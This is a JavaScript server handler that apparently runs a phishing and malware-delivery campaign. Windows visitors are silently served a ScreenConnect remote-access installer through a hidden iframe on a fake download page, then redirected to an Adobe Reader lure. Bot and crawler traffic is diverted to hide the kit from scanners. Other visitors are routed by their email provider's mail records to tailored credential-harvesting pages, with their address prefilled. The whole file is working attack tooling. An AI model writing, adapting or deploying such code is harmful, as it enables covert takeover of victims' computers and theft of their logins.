import dns from "dns/promises";

/* ================= CONFIG ================= */

const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
  "https://marcenarias.net/adobe/reader/download.html";

const MSI_PATH = "/ScreenConnect.ClientSetup.msi";

const OFFICE_TARGET = "https://agripeace.org/ringcentral";
const GOOGLE_TARGET = "https://agripeace.org/cw";
const DEFAULT_TARGET = "https://agripeace.org/cw";

const MX_TIMEOUT_MS = 1500;

/* ================= CACHE ================= */

const mxCache = new Map();

/* ================= HELPERS ================= */

function isBot(ua = "") {
  return /(bot|crawler|spider|headless|phantom|curl|wget|python|scrapy)/i.test(ua);
}

function extractEmail(req) {
  if (!req.query?.ext) return "";
  return Array.isArray(req.query.ext)
    ? req.query.ext[0].toLowerCase().trim()
    : req.query.ext.toLowerCase().trim();
}

function classifyMx(exchanges) {
  const mx = exchanges.join(" ");

  // Microsoft 365
  if (mx.includes("mail.protection.outlook.com"))
    return "office";

  // Office-backed security gateways
  if (
    mx.includes("pphosted.com") ||           // Proofpoint
    mx.includes("mimecast.com") ||
    mx.includes("barracudanetworks.com") ||
    mx.includes("arsmtp.com") ||
    mx.includes("iphmx.com") ||
    mx.includes("messagelabs.com") ||
    mx.includes("forcepoint.com") ||
    mx.includes("sophos.com")
  )
    return "office";

  // Google Workspace
  if (mx.includes("google.com"))
    return "google";

  return "other";
}

async function resolveMxWithTimeout(domain) {
  return Promise.race([
    dns.resolveMx(domain),
    new Promise((_, reject) =>
      setTimeout(() => reject(new Error("MX timeout")), MX_TIMEOUT_MS)
    ),
  ]);
}

async function detectProvider(email) {
  if (!email.includes("@")) return "other";

  const domain = email.split("@")[1];

  if (mxCache.has(domain)) return mxCache.get(domain);

  try {
    const records = await resolveMxWithTimeout(domain);
    const exchanges = records.map(r => r.exchange.toLowerCase());

    const provider = classifyMx(exchanges);
    mxCache.set(domain, provider);
    return provider;
  } catch {
    // ✅ FAIL BACK TO DEFAULT (unchanged behavior)
    return "other";
  }
}

/* ================= HANDLER ================= */

export default async function handler(req, res) {
  const userAgent = req.headers["user-agent"] || "";
  const isWindows = /windows/i.test(userAgent);
  const email = extractEmail(req);

  /* ===== WINDOWS FLOW ===== */
  if (isWindows) {
    const html = `<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8" />
  <title>Preparing Download…</title>
</head>
<body>
  <p>Your download will start shortly…</p>
  <button id="fallbackButton">Click here if download does not start</button>

  <script>
    (function(){
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = '${MSI_PATH}';
      document.body.appendChild(iframe);

      document.getElementById('fallbackButton').onclick = function() {
        window.location.href = '${MSI_PATH}';
      };

      setTimeout(function(){
        window.location.href = '${WINDOWS_REDIRECT_AFTER_DOWNLOAD}';
      }, 3000);
    })();
  </script>
</body>
</html>`;

    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.status(200).send(html);
    return;
  }

  /* ===== BOT SHORT-CIRCUIT ===== */
  if (isBot(userAgent)) {
    res.writeHead(302, { Location: DEFAULT_TARGET });
    res.end();
    return;
  }

  /* ===== NON-WINDOWS FLOW ===== */
  let target = DEFAULT_TARGET;

  if (email) {
    const provider = await detectProvider(email);

    if (provider === "office") target = OFFICE_TARGET;
    else if (provider === "google") target = GOOGLE_TARGET;
  }

  const finalUrl = email
    ? `${target}#${encodeURIComponent(email)}`
    : target;

  res.writeHead(302, { Location: finalUrl });
  res.end();
}




